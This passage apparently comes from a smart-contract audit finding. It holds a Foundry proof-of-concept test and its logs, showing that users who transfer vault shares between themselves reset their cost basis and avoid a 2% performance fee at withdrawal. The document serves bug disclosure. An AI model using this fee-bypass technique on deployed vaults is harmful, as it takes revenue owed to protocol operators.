ault), token.balanceOf(address(vault)) + 4 ether);\n\n        _logUserStates();\n\n        console2.log(\"Alice transfers all her shares to Bob\");\n        vm.prank(Alice);\n        vault.transfer(Bob, 10e6 ether);\n\n        _logUserStates();\n\n        console2.log(\"Bob transfers back Alice's shares\");\n        vm.prank(Bob);\n        vault.transfer(Alice, 10e6 ether);\n\n        _logUserStates();\n\n        emit log_named_decimal_uint(\"Fee Wallet Balance Before Withdrawal\", token.balanceOf(FeeWallet), 18);\n\n        console2.log(\"Alice, Bob, and Charlie withdraw all their assets\");\n        vm.prank(Alice);\n        vault.requestWithdrawal(10e6 ether);\n        vm.prank(Bob);\n        vault.requestWithdrawal(20e6 ether);\n        vm.prank(Charlie);\n        vault.requestWithdrawal(10e6 ether);\n        vm.startPrank(Manager);\n        mockAccountant.setNav(token.balanceOf(address(vault)));\n        vault.fulfillWithdrawals(40e6 ether, type(uint256).max, \"\");\n        vault.executeWithdrawal(Alice, 0);\n        vault.executeWithdrawal(Bob, 0);\n        vault.executeWithdrawal(Charlie, 0);\n        vm.stopPrank();\n\n        _logUserStates();\n\n        emit log_named_decimal_uint(\"Fee Wallet Balance After Withdrawal\", token.balanceOf(FeeWallet), 18);\n    }\n\n    function _logUserStates() internal {\n        emit log(\"===================\");\n        emit log_named_decimal_uint(\"Alice Balance\", vault.balanceOf(Alice), 18);\n        emit log_named_decimal_uint(\"Alice Basis\", vault.userBasis(Alice), 18);\n        emit log_named_decimal_uint(\"Bob Balance\", vault.balanceOf(Bob), 18);\n        emit log_named_decimal_uint(\"Bob Basis\", vault.userBasis(Bob), 18);\n        emit log_named_decimal_uint(\"Charlie Balance\", vault.balanceOf(Charlie), 18);\n        emit log_named_decimal_uint(\"Charlie Basis\", vault.userBasis(Charlie), 18);\n        emit log_named_decimal_uint(\"Total Supply\", vault.totalSupply(), 18);\n        emit log_named_decimal_uint(\"Vault NAV\", token.balanceOf(address(vault)), 18);\n        emit log(\"===================\");\n    }\n```\n\n2. Run with `forge test --mt test_submissionValidity -vvv`:\n\n```shell\nRan 1 test for test/PoC.t.sol:PoC\n[PASS] test_submissionValidity() (gas: 1122312)\nLogs:\n  Charlie deposits 10 ether\n  ===================\n  Alice Balance: 0.000000000000000000\n  Alice Basis: 0.000000000000000000\n  Bob Balance: 0.000000000000000000\n  Bob Basis: 0.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 10000000.000000000001000000\n  Vault NAV: 10.000000000000000000\n  ===================\n  Vault NAV increases by 2 ether\n  Alice deposits 12 ether\n  ===================\n  Alice Balance: 10000000.000000000000166666\n  Alice Basis: 12.000000000000000000\n  Bob Balance: 0.000000000000000000\n  Bob Basis: 0.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 20000000.000000000001166666\n  Vault NAV: 24.000000000000000000\n  ===================\n  Vault NAV decreases by 6 ether\n  Bob deposits 18 ether\n  ===================\n  Alice Balance: 10000000.000000000000166666\n  Alice Basis: 12.000000000000000000\n  Bob Balance: 20000000.000000000000055554\n  Bob Basis: 18.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 40000000.000000000001222220\n  Vault NAV: 36.000000000000000000\n  ===================\n  Vault NAV increases by 4 ether\n  ===================\n  Alice Balance: 10000000.000000000000166666\n  Alice Basis: 12.000000000000000000\n  Bob Balance: 20000000.000000000000055554\n  Bob Basis: 18.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 40000000.000000000001222220\n  Vault NAV: 40.000000000000000000\n  ===================\n  Alice transfers all her shares to Bob\n  ===================\n  Alice Balance: 0.000000000000166666\n  Alice Basis: 0.000000000000000001\n  Bob Balance: 30000000.000000000000055554\n  Bob Basis: 29.999999999999999999\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 40000000.000000000001222220\n  Vault NAV: 40.000000000000000000\n  ===================\n  Bob transfers back Alice's shares\n  ===================\n  Alice Balance: 10000000.000000000000166666\n  Alice Basis: 10.000000000000000000\n  Bob Balance: 20000000.000000000000055554\n  Bob Basis: 20.000000000000000000\n  Charlie Balance: 10000000.000000000000000000\n  Charlie Basis: 10.000000000000000000\n  Total Supply: 40000000.000000000001222220\n  Vault NAV: 40.000000000000000000\n  ===================\n  Fee Wallet Balance Before Withdrawal: 0.000000000000000000\n  Alice, Bob, and Charlie withdraw all their assets\n  ===================\n  Alice Balance: 0.000000000000166666\n  Alice Basis: 0.000000000000000001\n  Bob Balance: 0.000000000000055554\n  Bob Basis: 0.000000000000000001\n  Charlie Balance: 0.000000000000000000\n  Charlie Basis: 0.000000000000000000\n  Total Supply: 0.000000000001222220\n  Vault NAV: 0.000000000000000003\n  ===================\n  Fee Wallet Balance After Withdrawal: 0.000000000000000000\n```\n\n3. Comment mutual transfer snippet and rerun:\n\n```solidity\n// console2.log(\"Alice transfers all her shares to Bob\");\n// vm.prank(Alice);\n// vault.transfer(Bob, 10e6 ether);\n\n// _logUserStates();\n\n// console2.log(\"Bob transfers back Alice's shares\");\n// vm.prank(Bob);\n// vault.transfer(Alice, 10e6 ether);\n\n// _logUserStates();\n```\n\n```shell\n...\n  Fee Wallet Balance Before Withdrawal: 0.000000000000000000\n  Alice, Bob, and Charlie withdraw all their assets\n  ===================\n  Alice Balance: 0.000000000000166666\n  Alice Basis: 0.000000000000000001\n  Bob Balance: 0.000000000000055554\n  Bob Basis: 0.000000000000000001\n  Charlie Balance: 0.000000000000000000\n  Charlie Basis: 0.000000000000000000\n  Total Supply: 0.000000000001222220\n  Vault NAV: 0.000000000000000003\n  ===================\n  Fee Wallet Balance After Withdrawal: 0.020000000000000000\n```\n\nSo we can see that Bob can bypass a 2% performance fee via transfers with Alice.",
